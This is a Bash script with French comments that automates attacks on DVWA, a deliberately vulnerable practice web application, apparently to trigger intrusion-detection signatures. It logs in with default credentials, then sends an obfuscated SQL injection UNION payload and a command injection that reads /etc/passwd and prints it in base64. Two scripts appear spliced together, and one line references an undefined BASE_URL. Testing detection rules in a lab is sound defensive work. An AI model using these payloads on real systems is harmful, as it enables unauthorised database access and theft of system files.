#!/bin/bash

# Configuration
TARGET_IP="dvwa"
TARGET_PORT="80"
DVWA_URL="http://${TARGET_IP}:${TARGET_PORT}"
LOGIN_URL="${DVWA_URL}/login.php"
SECURITY_URL="${DVWA_URL}/security.php"
SETUP_URL="${DVWA_URL}/setup.php"
CMD_URL="${BASE_URL}/vulnerabilities/exec/"
COOKIE_FILE="/tmp/dvwa_cookie.txt"
RAW_LOG="dvwa_raw_response.html"

echo "=== Début de la simulation d'attaques sur DVWA ==="
rm -f "${COOKIE_FILE}"

# -------------------------------------------------------------
# Étape 1 : Authentification robuste
# -------------------------------------------------------------

echo "[*]Récupération du jeton CSRF et de l'ID de session pour le Setup..."
# On récupère la page ET on initialise le fichier cookie
HTML_SETUP_GET=$(curl -s -c "$COOKIE_FILE" "$SETUP_URL")
SETUP_TOKEN=$(echo "$HTML_SETUP_GET" | sed -nE "s/.*name=['\"]user_token['\"] value=['\"]([a-f0-9]+)['\"].*/\1/p")

# Extraction manuelle du PHPSESSID depuis le fichier généré par curl
PHPSESSID=$(grep "PHPSESSID" "$COOKIE_FILE" | awk '{print $7}')
if [ -z "$PHPSESSID" ]; then
    # Format alternatif si écrit différemment dans le fichier cookie d'Alpine
    PHPSESSID=$(grep "PHPSESSID" "$COOKIE_FILE" | sed -nE 's/.*PHPSESSID[[:space:]]+([^[:space:]]+).*/\1/p')
fi
echo "[+] Session active ID : $PHPSESSID"

echo "[*] Récupération du jeton CSRF de connexion..."
HTML_LOGIN=$(curl -s -L -H "Cookie: PHPSESSID=${PHPSESSID}" "$LOGIN_URL")
USER_TOKEN=$(echo "$HTML_LOGIN" | sed -nE "s/.*name=['\"]user_token['\"] value=['\"]([a-f0-9]+)['\"].*/\1/p")

if [ -z "$USER_TOKEN" ]; then
    echo "[-] Erreur : Impossible de récupérer le jeton CSRF de connexion."
    exit 1
fi
echo "[+] Jeton CSRF de connexion trouvé : $USER_TOKEN"

echo "[*] Authentification (Login)..."
# Envoi explicite du PHPSESSID via l'en-tête HTTP
HTML_INDEX=$(curl -s -L -H "Cookie: PHPSESSID=${PHPSESSID}" \
     -d "username=admin&password=password&user_token=${USER_TOKEN}&Login=Login" \
     "$LOGIN_URL")

# Vérification du succès
if echo "$HTML_INDEX" | grep -q "Logout"; then
    echo "[+] Authentification réussie !"
else
    echo "[-] Échec de l'authentification. Le serveur a encore rejeté la session."
    exit 1

fi




echo "[*] Envoi du payload d'obfuscation SQL (Trigger SID 28344)..."

# Payload contenant exactement 5 occurrences consécutives de 'CHR(' dans l'URI
PAYLOAD_OBFUSCATED="%27%20UNION%20SELECT%20CHR(115)||CHR(101)||CHR(108)||CHR(101)||CHR(99)||CHR(116),user_id%20FROM%20users--%20"

# Exécution de la requête cURL
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: PHPSESSID=${PHPSESSID}" \
     "${DVWA_URL}/vulnerabilities/sqli/?id=${PAYLOAD_OBFUSCATED}")
echo "[+] Requête envoyée. Code retour HTTP du serveur : $RESPONSE"





#!/bin/sh
# Ce script réutilise la variable ${PHPSESSID} générée précédemment

CMD_URL="${DVWA_URL}/vulnerabilities/exec/"
RAW_LOG="dvwa_raw_response.html"

echo "[*] Étape 6 : Envoi du payload d'injection de commandes..."

PAYLOAD="ip=127.0.0.1%3B+cat+/etc/passwd+%7C+base64&Submit=Submit"

# Envoi de la requête et sauvegarde de la réponse HTML brute
curl -s -L -H "Cookie: PHPSESSID=${PHPSESSID}" \
     -d "${PAYLOAD}" \
     "${CMD_URL}" > "$RAW_LOG"

echo "[*] Analyse de la réponse du serveur..."

# Vérification si l'application a répondu
if [ ! -s "$RAW_LOG" ]; then
    echo "[-] Erreur : Le fichier de réponse est totalement vide (0 octet)."
    exit 1
fi

# Tentative d'affichage direct du bloc de texte contenant le résultat de la commande
echo "==================== [ SORTIE DU SERVEUR ] ===================="
if grep -q "<pre>" "$RAW_LOG"; then
    # Extrait tout ce qui se trouve entre <pre> et </pre> de manière robuste pour Alpine
    sed -n '/<pre>/,/<\/pre>/p' "$RAW_LOG" | sed 's/<[^>]*>//g'
else
    echo "[-] Balise <pre> non trouvée dans le HTML."
    echo "[*] Titre de la page reçue :"
    sed -nE 's/.*<title>([^<]+)<.*/\1/p' "$RAW_LOG"
fi
echo "=============================================================="

# Nettoyage du fichier de debug
rm -f "$RAW_LOG"

